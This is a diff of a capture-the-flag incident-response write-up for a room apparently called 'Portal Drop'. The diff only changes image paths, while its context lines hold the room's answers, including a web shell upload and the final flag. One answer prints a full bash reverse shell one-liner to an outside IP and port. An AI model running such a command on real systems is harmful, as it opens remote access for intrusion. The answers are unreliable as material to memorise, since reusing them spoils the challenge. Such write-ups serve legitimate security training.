@@ -92,7 +92,7 @@ awk '{print $1 " | " $9}' Downloads/access-combined-crm-*.log | grep "401" | gre
 ```
 34.67.91.83
 ```
-![Answer](../images/Portal-Drop-1.png)
+![Answer](../imgs/Portal-Drop-1.png)
 
 ---
 
@@ -126,7 +126,7 @@ Filtering specifically for POST requests to the login endpoint (`/CRM/login.php`
 ```
 18, 35
 ```
-![Answer](../images/Portal-Drop-2.png)
+![Answer](../imgs/Portal-Drop-2.png)
 
 ---
 
@@ -157,7 +157,7 @@ The `python-requests/2.31.0` User-Agent identifies an automated Python script â€
 ```
 python-requests/2.31.0
 ```
-![Answer](../images/Portal-Drop-3.png)
+![Answer](../imgs/Portal-Drop-3.png)
 
 ---
 
@@ -188,7 +188,7 @@ The file was named `invoice.php` â€” a deliberate choice to disguise a PHP web s
 ```
 invoice.php
 ```
-![Answer](../images/Portal-Drop-4.png)
+![Answer](../imgs/Portal-Drop-4.png)
 
 ---
 
@@ -217,7 +217,7 @@ The 2-second gap between upload (`14:27:32`) and first invocation (`14:27:34`) i
 ```
 2025-11-06 14:27:34
 ```
-![Answer](../images/Portal-Drop-5.png)
+![Answer](../imgs/Portal-Drop-5.png)
 
 ---
 
@@ -259,7 +259,7 @@ The attacker uploaded a **PHP web shell** (`invoice.php`) to the CRM portal's up
 ```
 T1505.003
 ```
-![Answer](../images/Portal-Drop-6.png)
+![Answer](../imgs/Portal-Drop-6.png)
 
 ---
 
@@ -285,7 +285,7 @@ EDR process tree analysis shows that all attacker commands are spawned as child 
 ```
 /usr/sbin/php-fpm7.4
 ```
-![Answer](../images/Portal-Drop-7.png)
+![Answer](../imgs/Portal-Drop-7.png)
 
 ---
 
@@ -317,7 +317,7 @@ This redirects all shell I/O to `115.58.148.86:8080` â€” giving the attacker a f
 ```
 bash -i >& /dev/tcp/115.58.148.86/8080 0>&1
 ```
-![Answer](../images/Portal-Drop-8.png)
+![Answer](../imgs/Portal-Drop-8.png)
 
 ---
 
@@ -338,7 +338,7 @@ User: www-data
 ```
 www-data
 ```
-![Answer](../images/Portal-Drop-9.png)
+![Answer](../imgs/Portal-Drop-9.png)
 
 ---
 
@@ -363,7 +363,7 @@ File Read: /etc/trycrm/config.json
 ```
 /etc/trycrm/config.json
 ```
-![Answer](../images/Portal-Drop-10.png)
+![Answer](../imgs/Portal-Drop-10.png)
 
 ---
 
@@ -387,7 +387,7 @@ The domain name `portaldrop2025.xyz` â€” incorporating the room name and year â€
 ```
 portaldrop2025.xyz
 ```
-![Answer](../images/Portal-Drop-11.png)
+![Answer](../imgs/Portal-Drop-11.png)
 
 ---
 
@@ -402,7 +402,7 @@ After reviewing all EDR detections and responding to each alert (isolating the p
 ```
 THM{p0rtal_dropp3d?}
 ```
-![Answer](../images/Portal-Drop-12.png)
+![Answer](../imgs/Portal-Drop-12.png)
 
 ---
 
